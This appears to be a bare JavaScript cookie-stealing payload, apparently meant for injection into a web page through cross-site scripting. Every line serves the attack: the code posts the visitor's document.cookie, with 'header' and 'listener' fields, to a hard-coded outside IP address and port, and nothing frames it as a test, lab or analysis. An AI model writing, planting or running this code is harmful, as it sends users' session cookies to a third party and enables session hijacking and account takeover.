var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://39.101.137.200:7745/send');
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

xhr.onreadystatechange = function() {
  if (xhr.readyState === 4 && xhr.status === 200) {
    console.log(xhr.responseText);
  }
};

xhr.send('header=fdsafdsa&listener=admin789789&content=' + document.cookie);
